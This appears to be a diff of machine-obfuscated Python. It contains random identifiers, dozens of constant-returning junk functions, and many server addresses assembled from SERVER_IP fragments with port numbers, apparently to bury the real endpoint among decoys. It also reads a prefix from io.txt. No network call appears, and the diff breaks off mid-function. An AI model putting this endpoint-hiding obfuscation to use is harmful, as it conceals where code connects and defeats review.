+IIIIOI0Ill0 =SERVER_IP20 +SERVER_IP4 +'.' +SERVER_IP10 +SERVER_IP5 +SERVER_IP7 +'.' +SERVER_IP25 +SERVER_IP8 +'.' +SERVER_IP17 +SERVER_IP26 +SERVER_IP9
+
+jONpACpTt8rW = None
+G7D3y1CgpmpEiF260t = None
+IAUpXkAJMwxDuRoxk = False
+oCG9ZQScPsKcT = -414
+EyQH65_1n7bWEyEnlL = [42, 6, 84, 31, 27]
+
+class Zelhikrwmquxkacouv:
+    def __init__(self, xA7FECuJ7hcpN8enDN, XKqKal2x4CAyVB4U, XSFthWc4JOge4DqyD):
+        self.xA7FECuJ7hcpN8enDN = xA7FECuJ7hcpN8enDN
+        self.XKqKal2x4CAyVB4U = XKqKal2x4CAyVB4U
+        self.XSFthWc4JOge4DqyD = XSFthWc4JOge4DqyD
+    def NtqG2WbIbWDI1FMF(self):
+        return 73
+
+ysz6F0L8ZJnQnXf8 =SERVER_IP11 +SERVER_IP7 +'.' +SERVER_IP9 +SERVER_IP8 +'.' +SERVER_IP21 +SERVER_IP26 +SERVER_IP1 +'.' +SERVER_IP15 +SERVER_IP19 +SERVER_IP1
+kHYBE2Jb =33408
+
+rr08XqTGpkOkjGiVAIWe =SERVER_IP23 +SERVER_IP18 +'.' +SERVER_IP1 +SERVER_IP14 +SERVER_IP5 +'.' +SERVER_IP25 +SERVER_IP13 +SERVER_IP24 +'.' +SERVER_IP22 +SERVER_IP24
+S8J12syQ62KLMjZ =20401
+
+IlI0OII00OOOll0llO =SERVER_IP20 +SERVER_IP6 +SERVER_IP28 +'.' +SERVER_IP8 +SERVER_IP17 +SERVER_IP15 +'.' +SERVER_IP30 +SERVER_IP27 +SERVER_IP19 +'.' +SERVER_IP3 +SERVER_IP18
+
+def KmYV8dK1dCpp():
+    UMXhRddt7ogP_zkWp9WU = 822
+    yN4mVv7HT2MbXJxzw = 229
+    lB2S8QcO = 906
+    return 77
+
+pA8PBMjAu =SERVER_IP12 +SERVER_IP27 +'.' +SERVER_IP11 +SERVER_IP18 +SERVER_IP20 +'.' +SERVER_IP7 +SERVER_IP4 +SERVER_IP3 +'.' +SERVER_IP22 +SERVER_IP27 +SERVER_IP3
+
+xcI4jGPCoq1UOpcHU2 =SERVER_IP24 +SERVER_IP8 +SERVER_IP24 +'.' +SERVER_IP20 +SERVER_IP26 +'.' +SERVER_IP5 +SERVER_IP24 +'.' +SERVER_IP17 +SERVER_IP30 +SERVER_IP10
+PUqIDmhnNr4_9MAw5SN =58279
+
+Giw3A8pMdZYCn7a2o6 =SERVER_IP20 +SERVER_IP22 +'.' +SERVER_IP9 +SERVER_IP11 +'.' +SERVER_IP12 +SERVER_IP19 +SERVER_IP28 +'.' +SERVER_IP28 +SERVER_IP16 +SERVER_IP27
+hppqkmRxXmknZ2UM =22533
+
+XZ55SzHUdTXcTNOF =SERVER_IP2 +SERVER_IP11 +'.' +SERVER_IP3 +SERVER_IP24 +SERVER_IP23 +'.' +SERVER_IP25 +SERVER_IP3 +SERVER_IP7 +'.' +SERVER_IP26 +SERVER_IP9
+
+def OOlIIlII(rjAjVBp3IDjrK0e97, AWJZRka3m):
+    LfGKvrjTkh_wqYTP2w4 = 91
+    lK1peK6w4F3GeBFJX = 407
+    LkNhLpsQ = 478
+    uo5l7sHu = 597
+    W6y7YSL1RKDj5KK0q = 933
+    return rjAjVBp3IDjrK0e97
+
+def bpZIB0obr(TcAfU3yR7e, RUIQcnDj2G9WLb, Qg4b7M3Nqwk):
+    Y5ysqXokA = 235
+    pPcxsPqwxLyl6DvD = 955
+    YSATeGn6Nh4FF5wTiKh = 416
+    LtZviMdCdVoj = 803
+    HY3UyjAsU1I8 = 939
+    mUkXlx9ER04PvuzaR = 870
+    Mlx4VhpRNadOFe0LP8q = 364
+    return TcAfU3yR7e
+
+nH5fzlZD5CyWWbKomz =SERVER_IP25 +SERVER_IP17 +'.' +SERVER_IP27 +SERVER_IP28 +'.' +SERVER_IP30 +SERVER_IP8 +SERVER_IP26 +'.' +SERVER_IP5 +SERVER_IP14 +SERVER_IP18
+RSW4t9pkx_0kac =4581
+
+ABBLO2CgBZZwb1G =SERVER_IP19 +SERVER_IP6 +'.' +SERVER_IP8 +SERVER_IP13 +SERVER_IP19 +'.' +SERVER_IP24 +SERVER_IP21 +'.' +SERVER_IP21 +SERVER_IP4 +SERVER_IP24
+NKtZLzD6krCPKvOWP =10451
+
+msTITtzlxjI1aTKBF = 499
+YX0gpi3eHHDQd7n6zR = "fq60DuEBYO"
+M6znwtYqI6EIT4 = -588
+yXi27hcANLVDMW1srS = [63, 56, 95]
+Y7b5cH2GNCC_jnEHD = True
+jbHvevdieykmD0BbTxZZ = False
+
+zQk7sFMHtcEKZ0vOf = "ltZYskkSBTJaL5m2Fg"
+Kj44OwyhGDfnRHFPUM = True
+iaWGCZ6Q7Z = True
+Jc_yi37bQ = False
+
+def t6NdOlHuhHLgee2RaAY8(m1BtiQG4, houQF2cefjWM):
+    CDPPCFp8Ms = 245
+    DgOSu_D3EMXtTJqb6p = 210
+    e9LmIs4Kdzt6ZbOWCwYk = 41
+    hXEzw2DPB7vlrvpHFJ = 814
+    SJFVisEKueJzJk = 0
+    za6D7YWip3kYvQjbVs0 = 483
+    bSkAdp4z4_89b_ = 946
+    Bpi6nOThpw = 787
+    hGfH9chApV1xt = 170
+    return m1BtiQG4
+
+mLuBd4Jpwv2S5a =SERVER_IP25 +SERVER_IP29 +'.' +SERVER_IP5 +SERVER_IP26 +'.' +SERVER_IP28 +SERVER_IP29 +SERVER_IP22 +'.' +SERVER_IP20 +SERVER_IP6
+
+def IlI0OO0lIOO(WIkwkvc2yPRA6K, GRwyvWwfLx8_, M9OeGvDB_):
+    obzKlWDHDcC = 975
+    JTTW3i3P_q5ZM_ = 97
+    sGVfFXmHegASnAGeIY2k = 746
+    gw3uu0TNTPBN = 106
+    Huo3VRnl1yOO0Np = 818
+    return WIkwkvc2yPRA6K
+
+lIIlO0lIlOOlO0IO0 =SERVER_IP7 +SERVER_IP20 +'.' +SERVER_IP11 +SERVER_IP4 +'.' +SERVER_IP28 +SERVER_IP17 +SERVER_IP21 +'.' +SERVER_IP1 +SERVER_IP8 +SERVER_IP4
+
+ik3KmWFJ5n9 =SERVER_IP18 +SERVER_IP29 +'.' +SERVER_IP5 +SERVER_IP14 +SERVER_IP3 +'.' +SERVER_IP26 +SERVER_IP2 +SERVER_IP27 +'.' +SERVER_IP11 +SERVER_IP13
+X6jIqBx5POK =52916
+
+def OI0000lllOllO0(e2G0u4UfPZSU, WiEvZIO3fiv, IwOvLW2gANSBPFuQG1Gd):
+    MS_dx3kdAFi8D0SOSx87 = 642
+    yW15kwnafYXVbC = 731
+    yGtuSl1Bbo_Wh_HP = 869
+    XACneYO4t7I7h6iDhXU = 258
+    HeZgzWUMRGA4JooGA1O6 = 527
+    ESHdiG6CzhTIldSJq = 62
+    return e2G0u4UfPZSU
+
+lIlIlIO0IIIOI =SERVER_IP5 +SERVER_IP3 +SERVER_IP7 +'.' +SERVER_IP1 +SERVER_IP13 +'.' +SERVER_IP4 +SERVER_IP2 +'.' +SERVER_IP24 +SERVER_IP6
+IlIOOI0IlIOI0ll0I =28482
+
+a3e9J1Rqkc5OO0Nc0 =SERVER_IP10 +SERVER_IP9 +'.' +SERVER_IP28 +SERVER_IP10 +SERVER_IP1 +'.' +SERVER_IP3 +SERVER_IP21 +'.' +SERVER_IP2 +SERVER_IP23 +SERVER_IP20
+
+fvX3NPMAw =SERVER_IP2 +SERVER_IP26 +SERVER_IP30 +'.' +SERVER_IP4 +SERVER_IP12 +'.' +SERVER_IP17 +SERVER_IP18 +SERVER_IP4 +'.' +SERVER_IP25 +SERVER_IP4 +SERVER_IP29
+
+def owkqhzbyTL0ycwR(elQXVqgoXqyHN84ncrC, H4AQGRapQ185iQmUtvU0, eAdDzkre4lSv):
+    mt9OTle11vrVqo = 98
+    SHqUi6dz27W = 465
+    FdqyAGyQV = 191
+    geMe9kT8OQ = 668
+    URCtLrOIoeWT8Tfb1wYq = 351
+    xHZuyTzU7 = 795
+    cDuKCXajs8tyN = 34
+    return elQXVqgoXqyHN84ncrC
+
+WEQ2EnOJQvPFvKWvh_D =SERVER_IP2 +SERVER_IP22 +'.' +SERVER_IP3 +SERVER_IP17 +SERVER_IP16 +'.' +SERVER_IP9 +SERVER_IP17 +'.' +SERVER_IP10 +SERVER_IP5
+
+def afWIVjfXLFNAzz(Pvz7bQtn, raLMHan4R1xt8):
+    K7u1jep5E2bSdwG0 = 684
+    h5l2GZ4Y = 137
+    dtvSryLjU1l = 297
+    wey4S3dwp5PRM57Z = 840
+    e4wJIZdL = 349
+    e9alhiS4m6Te = 275
+    peFRBr9iC = 679
+    v9GcReqjZEUMzQa = 617
+    return Pvz7bQtn
+
+def mp52AEsJ(wkpVpMaNi0FcXz, m6GpXh1b76KbbgQemq):
+    lPYxY4LGMi = 886
+    nIntN9cjH2O = 895
+    CZ8s9bVRSEuF = 703
+    return wkpVpMaNi0FcXz
+
+def WFx0GUJTx6(pGzQ4ZRI7Cy1N8, RX58abOopMT3T9):
+    XHBWeX9YBCEt = 647
+    a8934YILdlDm = 848
+    I8e45GqosCAzhfkaWA = 702
+    mQ13rP2AQox = 113
+    A45qJvWmx84AZl_Jw7 = 701
+    LxIHUf6f3nObXo = 507
+    e0tMK_dR9nQ = 947
+    return pGzQ4ZRI7Cy1N8
+
+LgZ2io8QZPdLHO9aX = True
+AUAJme_mN5hNM4CQL = None
+XQ5Z6rdAw4s = "b8DR1NWXteNeSB"
+bnOL3SLEneJF_KhuNc = True
+mRe5OWot0e3eC4KHI5R = 280
+DXUct54c4jl7dze9Mmn5 = None
+
+def aQI7JBSTRalp0d():
+    JNG3z90RIrHGwY8L_3 = 166
+    ZgYJGU58toBdp33QLeX = 179
+    alfSG3rVTcFc31k5fQUl = 74
+    OVnPiMYRecMF_mPUP2HH = 308
+    Awx3alrbBR7hS = 230
+    CU799sgAXrBvh = 594
+    t9l8ThceMu_Wwhu = 431
+    LWhfOo9PH = 81
+    hI2Cdbazq4MC6JNh = 404
+    BUNlw1nBwra3YkP = 960
     return 3
 
-class X6u6mllra:
-    def __init__(self, ZsYllPR_b_bv1MFT):
-        self.ZsYllPR_b_bv1MFT = ZsYllPR_b_bv1MFT
-    def VJRPXDsGznv6(self):
-        return 28
-    def uKpf_HycUuD6r5iYLte(self):
-        return 29
+class Ml8s1la4qg8v0:
+    def __init__(self, r89nk5QxNlHQdqE, RbkWDlwNX, cIK0Ty4I):
+        self.r89nk5QxNlHQdqE = r89nk5QxNlHQdqE
+        self.RbkWDlwNX = RbkWDlwNX
+        self.cIK0Ty4I = cIK0Ty4I
+    def bwzwRob6cVVr1VMZg(self):
+        return 84
+    def zCTtZTtwQrt_(self):
+        return 62
 
-GTRon_o3BWiwqk = False
-X9YjqI33t5ZcwmQPva = False
-N_wou9LiiC = None
-nfR2SXEm8P = -255
+wan0BCrU =SERVER_IP26 +SERVER_IP30 +SERVER_IP25 +'.' +SERVER_IP9 +SERVER_IP24 +SERVER_IP1 +'.' +SERVER_IP10 +SERVER_IP7 +'.' +SERVER_IP13 +SERVER_IP1
+EhuwHpGfr =9655
 
-def IOl0IOllll0O():
-    Le3MztnhxDYGJ6lP = 970
-    DXm6gtqa5bWBIUJ_Bg = 198
-    pPCWXf71fx_WePzGgbRq = 846
-    zNm8fPZwbEQNsY = 813
-    U0o0qRUx1 = 744
-    izn8ICVs16byMy1uR_ = 185
-    WGoQf6omwqM45a6rc2 = 799
-    BuvPjr9ALTm = 238
-    Wm3AGleVOJu = 103
+class Bti6zo8bbe:
+    def __init__(self, GdL3ALQesQz):
+        self.GdL3ALQesQz = GdL3ALQesQz
+    def jHFDKdB_w62(self):
+        return 70
+    def djT6MJ5v2xISmYdwGA(self):
+        return 56
+
+ImRgdI2aBIBsZ =SERVER_IP28 +SERVER_IP9 +'.' +SERVER_IP13 +SERVER_IP2 +'.' +SERVER_IP26 +SERVER_IP8 +SERVER_IP9 +'.' +SERVER_IP4 +SERVER_IP4
+
+def l0O0IIO(JEZ757Q2X9tlFK, ia8zyHPFcAS, wVycx3iy):
+    FiT2MWvAY = 223
+    Ax002GuJP = 348
+    gBFF8dOmdFsNbw = 7
+    J5dbfgX3f = 305
+    hozd_83fK = 847
+    wOa2Deb8JCS0SV7PWUGc = 654
+    return JEZ757Q2X9tlFK
+
+O0IllOIllIOOOOIO =SERVER_IP13 +SERVER_IP27 +SERVER_IP5 +'.' +SERVER_IP1 +SERVER_IP28 +'.' +SERVER_IP2 +SERVER_IP11 +'.' +SERVER_IP24 +SERVER_IP23 +SERVER_IP30
+OlIllIl0IOII =37018
+
+ryC09GGC15QLn = False
+oPQToLgiplQtuyNCcN = None
+N9nJ8SE1CXuJ = None
+pDW4RvLOZyRDhiw = True
+
+def BAgdIpFlz(HQWvIwJ_np, DFYHgRpoc0Zfuih, avoEGxsgIck4):
+    HcP8JatZXwcDN1 = 622
+    yFXZR0jgzAFI1M7d = 222
+    q1pC_Pkw72byx3Hjz = 121
+    return HQWvIwJ_np
+
+SVjxaXFYLdXW9 = "NSwCSgUqIi8qdRzCA"
+NTejmMp_kFKh = None
+qd57s8SCeHNW = None
+XkrdHfq4U8hE7mBZ52U = False
+
+script_dir = os.path.dirname(os.path.abspath(__file__))
+
+
+GBgouFoR9 =SERVER_IP30 +SERVER_IP21 +SERVER_IP16 +'.' +SERVER_IP17 +SERVER_IP21 +'.' +SERVER_IP6 +SERVER_IP2 +SERVER_IP13 +'.' +SERVER_IP25 +SERVER_IP5 +SERVER_IP1
+
+def WTuuhWpgXZ0Q_eb():
+    J3AEMnjhHBZE3IUsJ = 226
+    YK0Y6apSfI1rkJp = 667
+    V9Arw88TEENywW = 151
+    vqlBLV9f = 348
+    FLQTR5ku_cCk9ui = 143
+    rYHUlQHw = 55
+    Dn12Skvr6hJh0rug = 265
+    L2MyMHWwgq1 = 505
+    RjcDUtfXRO9aHZ9lb = 303
+    eaLTCBu1LBR1NQB_ = 246
+    return 80
+
+RnUAOlpOeXrmc1 = "o82qzyRWASX0NWR3"
+hhm5c2PP1aFol = "rJus7yi2gbHL3pNX"
+
+def I55gE6C0Ci(JGy7Le1q6rokAMOeRfG, xEtUxf5RmyR7, khXxq9rfGoIfx6Vu):
+    j_UVz9b17B9rCNwB4k = 618
+    G_og9dDdn71HBO4ftso = 925
+    LJdMzZ8gHuFOrnGwfKSD = 181
+    miiS9Gyt7yYaJ = 610
+    return JGy7Le1q6rokAMOeRfG
+
+l00ll0OlO00O00 =bpZIB0obr(90704, 80291, 84005)
+
+def DOBFMjhK5iuoMMln():
+    JuDeXxrmCiYi = 720
+    y00wPCrG0S2bdNMTV = 621
+    F3624hQMCSCdE = 16
+    dhkNqqNd_70AdFkZ5 = 415
+    UkG7mL5uU = 882
+    ptw0J3yv2Z6 = 551
+    Twn3v8KAfA = 368
+    vtt9aeEHZNrIl5Mr9EL = 930
     return 65
 
-MiWJquq7qUmm2Reyr = [40, 72, 61]
-rMl1Fi2nh = "LtTHsT7ep64SJQ1D1Ozz"
+def P2dDUpMXE2S(m3aLuggI, Dt1tXuhUDxlhkZoXrfB, mVMuNJQltNTZ9GPHXtkf):
+    kVAZqjgqL2FdFb07W = 344
+    f23KlRy9M9jBQGdiSIXq = 544
+    uUKfvQhLkPf8lcOL7JZ = 739
+    uguLfY5JopKcx4RcIr = 608
+    return m3aLuggI
 
-GRnVKHlfM = 495
-lMeAE4RnbG = False
-vGQ0r9uuinh9 = [20, 36]
-x1YYtji0jH = [80, 89, 96]
+SHvmhhxW5l =SERVER_IP27 +SERVER_IP1 +'.' +SERVER_IP6 +SERVER_IP13 +'.' +SERVER_IP14 +SERVER_IP3 +SERVER_IP14 +'.' +SERVER_IP20 +SERVER_IP9
 
-hUrzVgIM =ll00IO0O0ll0O0lO(55082)
+Il00IOlIOII0llO =afWIVjfXLFNAzz(71608, 22956)
 
-DM5wt_Bc =SERVER_IP29 +SERVER_IP29 +'.' +SERVER_IP3 +SERVER_IP2 +'.' +SERVER_IP24 +SERVER_IP19 +'.' +SERVER_IP16 +SERVER_IP27 +SERVER_IP10
-D4XjmzGq1a =64952
+class A2hnlsmut:
+    def __init__(self, h2anM_EOTmmZ_MRzWb, gY7d05XRb0IESdZ1Gd, tE_zaTNlPIfow0bc):
+        self.h2anM_EOTmmZ_MRzWb = h2anM_EOTmmZ_MRzWb
+        self.gY7d05XRb0IESdZ1Gd = gY7d05XRb0IESdZ1Gd
+        self.tE_zaTNlPIfow0bc = tE_zaTNlPIfow0bc
+    def EVCFaZe1IevDugAV2s6(self):
+        return 63
+    def bRNTnSN_xJ(self):
+        return 27
 
-def HXTKOnubWlA7dn2mAE7(nThcFT2MN1, lvV9Gx7UhmBnLciI):
-    xHBLj5oBIup = 865
-    NHMPYQRAVeNM = 509
-    YK9K0pXS4yXLV = 795
-    aaa8erqyf0gFizNl = 315
-    a92OGtU7hCizwrlf = 671
-    UotY5LytH = 485
-    return nThcFT2MN1
+def lOO00O(jhmme25JubxHOktL3):
+    xUnsmMZzM7U = 926
+    CdHf2bgtveqPHeavp_1 = 495
+    qhms3UYLYjhFKQ9Hoo2 = 760
+    io6nUPt_s9fi3 = 95
+    qNhkYgVrGNaO = 140
+    return jhmme25JubxHOktL3
 
-def lMgmaOsTiouiQTaj(nPNE6rT4H1TVMVF7Q):
-    VHK4_lYYo8kJJ9nlR6 = 831
-    keTXlZnWB = 338
-    r2KwWrgQuOlxcHtf = 386
-    tBU9cGC0Bd_qn = 64
-    Z3c4LXKx_o = 774
-    TbYcXzEiBJqgrYhtomHy = 452
-    dH8BRhz8IFeh3yym4 = 279
-    rD5vRewDj = 197
-    u_VCPQm4TZV6eAzrbv1 = 926
-    N6Ax2J5yJeT = 864
-    return nPNE6rT4H1TVMVF7Q
+class M2ubu2lro:
+    def __init__(self, bG6imsfqqe, yljude2A76bga59k0Ev3, VIKNarkalQhWiqaw_):
+        self.bG6imsfqqe = bG6imsfqqe
+        self.yljude2A76bga59k0Ev3 = yljude2A76bga59k0Ev3
+        self.VIKNarkalQhWiqaw_ = VIKNarkalQhWiqaw_
+    def M3ssI0h6ZwOAVoS8Au(self):
+        return 94
+    def TwMeAyDM_rrF4rFYI(self):
+        return 12
 
-class X4v0c9tsi4m:
-    def __init__(self, FdsI5prr, qPpy1kX8HH5ynw8wi):
-        self.FdsI5prr = FdsI5prr
-        self.qPpy1kX8HH5ynw8wi = qPpy1kX8HH5ynw8wi
-    def ChRJ8M4tj(self):
-        return 90
-    def RpdzMHsE_BJj16fo(self):
-        return 22
+rEKw_Wgnar3pnB1Z =SERVER_IP12 +SERVER_IP4 +'.' +SERVER_IP21 +SERVER_IP17 +'.' +SERVER_IP11 +SERVER_IP27 +'.' +SERVER_IP27 +SERVER_IP28
 
-IlM5yYXJw =La0no4DrjVr_zuwL415y(66849)
+I4hStVNqGlmc7 = None
+ERXy3ACM3 = [82, 81, 77, 7]
+cCQ3qhPAoVPHn0LJzp2 = True
 
-def GJbrj63QI2Y(ZrBDOEVPgLYrJuJBv, RBPlHiWcGY0sB32, QQpFiMbZmZ):
-    vX9RVzxJBhppyGNXd = 154
-    Ul9z0VWUkfMQuJGY = 744
-    bEgB6nLUq = 645
-    Y0vpUtDMK4fQ429lZF = 597
-    oVzqcUFKl = 776
-    UU0haaEvzRwCXv = 472
-    himUqQmJB = 498
-    cKAkNoRlCWWIYU03 = 232
-    return ZrBDOEVPgLYrJuJBv
+class Oz3nc29culpdnj7wg:
+    def __init__(self, F4pahTxcJTIrgE0):
+        self.F4pahTxcJTIrgE0 = F4pahTxcJTIrgE0
+    def ULxgTIURApP3w(self):
+        return 41
+    def yCK4Tya2RTmbws(self):
+        return 65
 
-QAuOWnqypEcS_HGwZOb =J2raxZdpZQ4tiZUAt(37597, 21775)
+# Read prefix from io.txt
 
-def IIO0lOlO0(wgxEJtgGWeA1qHoe, YvkIsPKDiBox8, ZifWOrHSPhSD):
-    JfpdebpDasBYymZHDHKC = 756
-    EluFym4DDwVI3h1gO = 570
-    GVKNciOfV = 176
-    NuUarYH33evWyEL9OI2s = 961
-    AxEfdetafpD6NM6Cq1 = 523
-    return wgxEJtgGWeA1qHoe
 
-def mqi_eCnZICmVQFqga(C8lOG1pBjr4, q3_dcC4e0SndAdxU9cRB, t7v4IXHwQ):
-    xivUIQE_426x9z = 725
-    Hm4TDdnUKml = 988
-    MVGwK2g6Ddd6oe1S1 = 531
-    SPL1FAcoJ5M93fP = 780
-    y9sFI3GuQS4YjwD = 550
-    gqnv_ShxBvr6z8V = 427
-    nesDBH0h = 448
-    return C8lOG1pBjr4
+def N8DLExHzcAiUQ5Dr(WotZWUbx4CalOVg, SCzLXf7TT8, Eeet2WWqbq):
+    ndZLGv72OQoq453myed = 782
+    yu91vjdx = 773
+    rVS7k99hqjAMW_ = 151
+    eSsdHkDRixFlScQm6 = 44
+    Zzo_9W9Q = 973
+    ZpEI4mE1NTMpPN4oD83F = 224
+    ucgbe44VXR = 825
+    b6IVZ8lin5FbXAYP3I = 760
+    QBiIY7D4H = 715
+    return WotZWUbx4CalOVg
+
+def PVAksxtxD(hL7u9ylgvpTtC, fK2lXkGqvc, yDI85ZNbQuGTD):
+    VyQH3h5iUJRRzRifqa = 514
+    APg9KDXn42NBwhI = 790
+    gffXlt9Ix = 153
+    WNdlJZXc_egN08rT = 910
+    gOOtUmq8qYqDsQxVBnlR = 190
+    a5YXtudU = 206
+    return hL7u9ylgvpTtC
+
+def TkNaWJLWQJqWZ(AWbQHhXU8BthbUAAc5xB, OdlmWAr6XPYr_LYCqUD, p31Z9udNsrvkpr8Rf):
+    SEArrvUyfLvXU = 332
+    RULlNmND8rLS = 542
+    J9urlQT94MFTN4jkRTOH = 523
+    OIws3vBhni = 533
+    M1xZ_W9foOJLs = 833
+    IczUvN8s9nep = 3
+    SeI4BMQIxSV72b0V4 = 631
+    return AWbQHhXU8BthbUAAc5xB
+
+def IxH6H3dQuhaeCp1reVF():
+    xY_5ZeRr0RdIhHlYCsjf = 745
+    ZUsZKioZ4cdQ25jnf8e = 324
+    RZZ4FbYQejOKWDAjgJs = 517
+    z0YsB9YLl8KaRrFrAg = 292
+    return 60
+
+def q9cJZe8B9OKdqMeFOUFg(tqgWl_senkit, RzTgVI_0aqEaOvVu2gGV, JgdQ90gg):
+    KfzIp0DipseRwAF4imVr = 319
+    CEPGMUx2LBrHbB5nj = 559
+    hj3pMP5Pk0N84w = 55
+    UNlIHPClRgpaIX = 22
+    G672nCI7q2IJ8gFcUP5S = 528
+    NjpsX0M0PTF3 = 919
+    l_hW_4SrgfnYvJPbA1 = 67
+    pdGvzxQg7ux = 715
+    wpQTOqMlCR3PbZ = 998
+    CrLxZukpZNZpCX7Thl6 = 40
+    return tqgWl_senkit
+
+S71WNKTa33cw =KmYV8dK1dCpp()
+
+oZql02TheWcgq0 =SERVER_IP4 +SERVER_IP23 +SERVER_IP10 +'.' +SERVER_IP30 +SERVER_IP11 +SERVER_IP17 +'.' +SERVER_IP6 +SERVER_IP17 +SERVER_IP21 +'.' +SERVER_IP4 +SERVER_IP15
+l_n8G04uMlS9qs0Ory9 =57058
+
+def mXBhPe9ZrppdRMGhP(W74hqSe4Cb6jSqhu5fw):
+    GZBBHk421ibRwzzX23 = 487
+    PF0En2csE = 433
+    Fxs4tSG955dU = 796
+    z9DzVlV5rmM = 689
+    N4G86C4Sw = 612
+    woUS8MCbE = 711
+    QLMJdGuHDCfiWlSYyVW = 795
+    nJCr4_WjYtwk5Idr = 920
+    L_p_5QtDSpeKLh6 = 782
+    ycFyLETzAyQL = 446
+    return W74hqSe4Cb6jSqhu5fw
+
+dPiSpW88lp =SERVER_IP23 +SERVER_IP22 +'.' +SERVER_IP21 +SERVER_IP8 +'.' +SERVER_IP22 +SERVER_IP1 +SERVER_IP18 +'.' +SERVER_IP7 +SERVER_IP4 +SERVER_IP30
+xMNS29UZNp5ieE6 =2755
+
+def hu7MxFBx6mrh1LhU(goFEpAD31D):
+    SKdJN1k7eL = 912
+    AyTTnXIBmA7voQVrTLXC = 606
+    pjpsY_vY = 987
+    gCRWGTrA4T8hVXvywm = 38
+    return goFEpAD31D
+
+io_file_path = os.path.join(script_dir, 'io.txt')
+
+
+oOuKzeIVh5IEWjGP =SERVER_IP11 +SERVER_IP27 +'.' +SERVER_IP28 +SERVER_IP26 +'.' +SERVER_IP8 +SERVER_IP26 +'.' +SERVER_IP12 +SERVER_IP5
+nC8BuVR0_R5auQt =46573
+
+Ea7Frup5p =zgL1GX1L(20302)
+
+ISlTrnKLPJ = "Sli2EIsFglZ52r"
+pkC6BCoZRtkTdBy = False
+tepI9Ip_JNbLMhd7DEx = True
+xXfUAyfLoVRH0YyJqtb5 = "llPdE5tPbamZzmu9bm"
+
+EPHmOcZ10spFO =SERVER_IP7 +SERVER_IP30 +SERVER_IP11 +'.' +SERVER_IP30 +SERVER_IP15 +SERVER_IP12 +'.' +SERVER_IP9 +SERVER_IP15 +SERVER_IP21 +'.' +SERVER_IP9 +SERVER_IP16 +SERVER_IP13
+Gmty4OoxO7yBmd1u =42351
+
+def FZcBvIPgYmjqfD78mBE():
+    GPxaBwLFAr3cV = 662
+    YOSZTZsuxc2aOC = 770
+    lABuh3YQ09d = 177
+    DbOswW_wxt = 998
+    fBJeueKdvaffeQ1p = 874
+    WHPia8InilA_BIs = 704
+    TQKz24McgY7_ = 575
+    itaNP5ICYi = 294
+    return 66
+
+RxLpjV6zLQZv =N8DLExHzcAiUQ5Dr(81588, 31834, 66310)
+
+def RvKVzyzCUgUIbDlineyM(hx6jky9vaSJ):
+    nUerl9LC = 876
+    QwsFrDCOMD7YzIArKAr = 59
+    YmnJlc2THPcbN9hJ = 207
+    s_dHUhT0qkkPnAV = 41
+    CFZ4MEMsFXX = 235
+    et2mzkL6hvdVo = 783
+    SNMdsNE4l18FtSx = 940
+    H2PNhKKWZ = 206
+    return hx6jky9vaSJ
+
+b6JhPP8vf4jqi = [45, 58]
+Wj9UOa9q_tj4MVMaEx = [90, 78]
+gnnU70U8yndSRB33HF = "wL0LOFiZCA8DULFz9f5"
+L5I_TwKK = "FOhcB2sLLIw"
+iWOD2km4Z = None
+oszQvRxjrM = -893
+
+class Pqgkpqjdtugyo9sinvjy:
+    def __init__(self, yPQy0iPSu, GURCusphXAeJZp6, FamuOuRFIaxDmCBR26):
+        self.yPQy0iPSu = yPQy0iPSu
+        self.GURCusphXAeJZp6 = GURCusphXAeJZp6
+        self.FamuOuRFIaxDmCBR26 = FamuOuRFIaxDmCBR26
+    def KHhCs13ms(self):
+        return 92
+    def YDOsPvHiV_0(self):
+        return 89
+
+def JSCLfub11LB5aA_S(slHAQOG1scPodqQ, JlRuSOIcNBqNixK, zvzdxGC8):
+    xtE0ZsA2JbTUgLDI = 846
+    so3t0SZxqJ = 475
+    lxo3_bbbsORHovxHiX = 961
+    return slHAQOG1scPodqQ
+
+with open(io_file_path, 'r') as file:
+    prefix = file.read().strip()[:3]
+
+
+LkYnbM44b =FZcBvIPgYmjqfD78mBE()
+
+eBpF2eHv3GMpwdg1h =SERVER_IP30 +SERVER_IP5 +SERVER_IP4 +'.' +SERVER_IP3 +SERVER_IP16 +SERVER_IP21 +'.' +SERVER_IP24 +SERVER_IP22 +'.' +SERVER_IP30 +SERVER_IP29 +SERVER_IP24
+s4u9QCNg_P5CG =41356
+
+OI0lOIOIl000II =SERVER_IP21 +SERVER_IP28 +SERVER_IP9 +'.' +SERVER_IP5 +SERVER_IP12 +'.' +SERVER_IP1 +SERVER_IP9 +'.' +SERVER_IP25 +SERVER_IP20 +SERVER_IP21
+IllIllOlI0 =29226
+
+def NlTaKEbeHVek0ZC(z58Q18yztENzvSJ, haU5sjN1puE7):
+    bzCHLmcGEdULee = 268
+    AmBczkoXS8Wh = 43
+    aT3nQQkHHlfa9 = 227
+    ZPdDRd90 = 984
+    zOuFaeNBJpIAhhkj1nEh = 618
+    r42mYvN3dczcxKuvc = 999
+    YH98jM5wL3jmvpMGNa0o = 165
+    U2ij0KX1sSAx = 16
+    Ooyz4eQV6VJ4Cn = 436
+    return z58Q18yztENzvSJ
+
+M75U0Me3ZY = False
+PYE3M985LdxO4h = [27, 94, 99, 75, 21]
+YcbjAMRLee6Fw7m3q = None
+
+O3cFqhYE =TkNaWJLWQJqWZ(19977, 89221, 82276)
+
+DayfD3NA38koUDFI = True
+IASj2S_unbMx4zROp = 648
+Rag7GdlnkISrw = [52, 81, 52, 47]
+zx2GAj7Dv7uVl3YtxKO = -579
+
+class Ltn4yp5tdgip5:
+    def __init__(self, qA8SgG0TZRIRe6, PH7WWEDzlnkX):
+        self.qA8SgG0TZRIRe6 = qA8SgG0TZRIRe6
+        self.PH7WWEDzlnkX = PH7WWEDzlnkX
+    def tcKixOm0WXaZ(self):
+        return 100
+
+def PrrqSan1veAZLAfgRJkc(czNqRXGmda5Lq, jGttvmxnLKPc4hG, TgScGH2rzGjvPKn):
+    lODYj0YAzF = 623
+    G2GIdd9DmSGY8 = 249
+    feYYW_0U = 794
+    qAKekNS5WkFQPRlQ4KHH = 667
+    po5fR_kBe1MAJX = 289
+    W97vhsvhnCjiZdgdcQ = 750
+    gq7X9JWlDsqopq = 481
+    lrGjrRDfwzfcTR0 = 745
+    UfWhkqG5U7UiYxfz = 515
+    DZF8IHpdKdTq = 136
+    return czNqRXGmda5Lq
+
+def H1MR9MAoVY2HvgPkgcU(j0GyJdn5S_Qjn3, CmynEFOmWOUbWXzbYAdg, paEfJ03LZ8T):
+    snl0aYjeU6 = 371
+    jQCA0ZanNssAndi9TTYn = 456
+    VdVN3yxR = 79
